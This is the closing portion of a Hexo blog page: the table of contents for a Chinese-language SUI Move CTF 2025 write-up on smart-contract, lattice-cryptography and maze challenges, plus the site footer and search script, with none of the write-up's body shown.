href="#3-%E8%AE%A1%E7%AE%97%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-text">3. 计算解决方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96Flag-1"><span class="toc-text">4. 获取Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E7%BB%93%E6%9E%9C"><span class="toc-text">解题结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E7%82%B9"><span class="toc-text">关键技术点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%81%A2%E5%A4%8D%E5%AF%86%E9%92%A5"><span class="toc-text">3. 恢复密钥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF-1"><span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83"><span class="toc-text">题目环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-text">1. 题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">2. 关键代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8E%9F%E7%90%86"><span class="toc-text">3. 密码学原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4-1"><span class="toc-text">解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-text">步骤1: 环境准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42-%E5%88%86%E6%9E%90%E5%AF%86%E6%96%87"><span class="toc-text">步骤2: 分析密文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43-%E4%BD%BF%E7%94%A8CVP%E7%AE%97%E6%B3%95%E8%A7%A3%E5%AF%86"><span class="toc-text">步骤3: 使用CVP算法解密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44-%E8%BF%90%E8%A1%8C%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC"><span class="toc-text">步骤4: 运行解密脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A45-%E9%AA%8C%E8%AF%81flag"><span class="toc-text">步骤5: 验证flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E7%BB%93%E6%9E%9C-1"><span class="toc-text">解题结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E8%A6%81%E7%82%B9"><span class="toc-text">技术要点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A0%BC%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80"><span class="toc-text">1. 格理论基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Babai%E7%AE%97%E6%B3%95"><span class="toc-text">2. Babai算法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Move%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6"><span class="toc-text">3. Move智能合约</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E8%BF%B7%E5%AE%AB%E6%B8%B8%E6%88%8F"><span class="toc-text">4. 迷宫游戏</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF-2"><span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%90%88%E7%BA%A6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90"><span class="toc-text">1. 合约结构分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%BF%B7%E5%AE%AB%E5%B8%83%E5%B1%80"><span class="toc-text">2. 迷宫布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B8%B8%E6%88%8F%E6%9C%BA%E5%88%B6"><span class="toc-text">3. 游戏机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-text">解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41-%E8%BF%B7%E5%AE%AB%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90"><span class="toc-text">步骤1: 迷宫路径分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42-%E8%B7%AF%E5%BE%84%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95"><span class="toc-text">步骤2: 路径搜索算法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43-%E6%89%BE%E5%88%B0%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-text">步骤3: 找到解决方案</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%BE%E4%B8%8A%E6%89%A7%E8%A1%8C"><span class="toc-text">链上执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41-%E5%88%9B%E5%BB%BA%E6%8C%91%E6%88%98"><span class="toc-text">步骤1: 创建挑战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42-%E5%AE%8C%E6%88%90%E8%BF%B7%E5%AE%AB%E6%8C%91%E6%88%98"><span class="toc-text">步骤2: 完成迷宫挑战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43-%E8%8E%B7%E5%8F%96Flag"><span class="toc-text">步骤3: 获取Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E7%82%B9-1"><span class="toc-text">关键技术点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Move%E5%90%88%E7%BA%A6%E5%88%86%E6%9E%90"><span class="toc-text">1. Move合约分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8"><span class="toc-text">2. 算法应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8C%BA%E5%9D%97%E9%93%BE%E4%BA%A4%E4%BA%92"><span class="toc-text">3. 区块链交互</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%95%B0%E6%8D%AE%E8%BD%AC%E6%8D%A2"><span class="toc-text">4. 数据转换</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%92%8C%E8%84%9A%E6%9C%AC"><span class="toc-text">工具和脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93"><span class="toc-text">综合技术总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%8A%80%E8%83%BD%E7%9F%A9%E9%98%B5"><span class="toc-text">核心技能矩阵</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Move%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%88%86%E6%9E%90"><span class="toc-text">1. Move智能合约分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AE%97%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-text">2. 算法与数据结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86"><span class="toc-text">3. 密码学知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF"><span class="toc-text">4. 区块链技术</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%88%86%E7%B1%BB"><span class="toc-text">攻击技术分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">1. 智能合约漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%97%B6%E9%97%B4%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB"><span class="toc-text">2. 时间相关攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%95%B0%E5%AD%A6%E6%94%BB%E5%87%BB"><span class="toc-text">3. 数学攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%94%BB%E5%87%BB"><span class="toc-text">4. 自动化攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5%E5%BB%BA%E8%AE%AE"><span class="toc-text">防御策略建议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8"><span class="toc-text">1. 代码安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AE%89%E5%85%A8"><span class="toc-text">2. 随机数安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-text">3. 访问控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%9B%91%E6%8E%A7%E5%92%8C%E5%AE%A1%E8%AE%A1"><span class="toc-text">4. 监控和审计</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-text">结论</span></a></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" target="_blank" rel="noopener" href="https://github.com/DudeGuuud">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
        <li>
          
              <a title="rss" href="/rss.xml">
                <i class="iconfont icon-rss"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/DudeGuuud">Copyright © 2025 DudeGuuud</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="搜索文章...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + SUI%20MOVE%20CTF%202025%20(1-4)%20Write%20Up + '&url=' + http%3A%2F%2Fexample.com%2F2025%2F08%2F05%2FMOVE%2520CTF%25202025%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2025/08/05/MOVE%20CTF%202025/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
